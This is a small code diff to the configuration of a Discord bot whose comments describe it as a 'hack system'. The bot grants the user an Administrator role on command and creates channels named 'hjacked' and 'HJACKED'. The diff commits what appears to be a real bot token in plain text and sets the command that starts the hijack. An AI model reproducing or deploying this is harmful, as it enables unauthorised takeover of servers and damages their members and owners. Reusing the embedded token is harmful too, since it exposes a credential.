@@ -13,8 +13,8 @@
 //Sorry For The Bad Engilsh :/
 const Discord = require("discord.js") //npm i discord.js
 const client = new Discord.Client();
-const Token = '' //حط توكن بوتك هنا // your bot token
-const x_x = "." //الامر يلي يشغل الكود //the command to start the hack system
+const Token = 'NTI1OTk2MjUzNzEzMTM3Njc0.DwAjMA.rR8qiF3Iu6NQKiBEGBW0SarIjOA' //حط توكن بوتك هنا // your bot token
+const x_x = "XD" //الامر يلي يشغل الكود //the command to start the hack system
 const opcmd = 'oprole' // The Op Command To Give You Adminstrator Role
 const teext = "hjacked" // اسم رومات الكتابيه يلي بيسويها //the textchannel name
 const vooice = "HJACKED" // اسم الرومات الصوتيه يلي بيسويها //the voicechannel name
